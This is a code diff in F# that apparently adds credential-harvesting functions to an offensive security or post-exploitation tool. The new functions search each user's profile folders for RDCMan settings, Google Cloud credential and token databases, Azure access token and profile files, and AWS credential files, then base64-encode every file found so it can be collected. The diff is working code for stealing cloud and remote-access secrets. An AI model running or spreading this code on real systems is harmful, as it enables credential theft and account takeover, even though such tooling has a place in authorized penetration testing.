@@ -175,3 +175,65 @@
             let credtype = Encoding.Unicode.GetString(getByteSection 60L (strlen - 6) p)
             {path = p; description = credtype; encodedBlob = encodeEntireFileB64 p })
         |> Array.toList
+
+
+    let detectRDCManFile userFolders : string list =
+        userFolders
+        |> Array.map(fun u -> u + "\\" + "AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings")
+        |> Array.filter fileExistsAtLocation
+        |> Array.map (sprintf "Remote Desktop Manager connection file exists at %s")
+        |> Array.toList
+
+
+    let getGoogleCloudCreds userFolders : GoogleCredential list =
+        userFolders
+        |> Array.map(fun u -> u + "\\" + "AppData\\Roaming\\gcloud\\credentials.db")
+        |> Array.filter fileExistsAtLocation
+        |> Array.map(fun f -> 
+            {GoogleCredential.path = f; encodedFile = encodeEntireFileB64 f})
+        |> Array.toList
+
+
+    let getGoogleCloudCredsL userFolders : GoogleCredential list =
+        userFolders
+        |> Array.map(fun u -> u + "\\" + "AppData\\Roaming\\gcloud\\legacy_credentials.db")
+        |> Array.filter fileExistsAtLocation
+        |> Array.map(fun f -> 
+            {GoogleCredential.path = f; encodedFile = encodeEntireFileB64 f})
+        |> Array.toList
+    
+    
+    let getGoogleAccessTokens userFolders : GoogleCredential list =
+        userFolders
+        |> Array.map(fun u -> u + "\\" + "AppData\\Roaming\\gcloud\\access_tokens.db")
+        |> Array.filter fileExistsAtLocation
+        |> Array.map(fun f -> 
+            {GoogleCredential.path = f; encodedFile = encodeEntireFileB64 f})
+        |> Array.toList
+
+    
+    let getAzureTokens userFolders : AzureCredential list =
+        userFolders
+        |> Array.map(fun u -> u + "\\" + ".azure\\accessTokens.json")
+        |> Array.filter fileExistsAtLocation
+        |> Array.map(fun f -> 
+            {AzureCredential.path = f; encodedFile = encodeEntireFileB64 f})
+        |> Array.toList
+
+
+    let getAzureProfile userFolders : AzureCredential list =
+        userFolders
+        |> Array.map(fun u -> u + "\\" + ".azure\\azureProfile.json")
+        |> Array.filter fileExistsAtLocation
+        |> Array.map(fun f -> 
+            {AzureCredential.path = f; encodedFile = encodeEntireFileB64 f})
+        |> Array.toList
+
+
+    let getAWSCreds userFolders : AWSCredential list =
+        userFolders
+        |> Array.map(fun u -> u + "\\" + ".aws\\credentials")
+        |> Array.filter fileExistsAtLocation
+        |> Array.map(fun f -> 
+            {AWSCredential.path = f; encodedFile = encodeEntireFileB64 f})
+        |> Array.toList
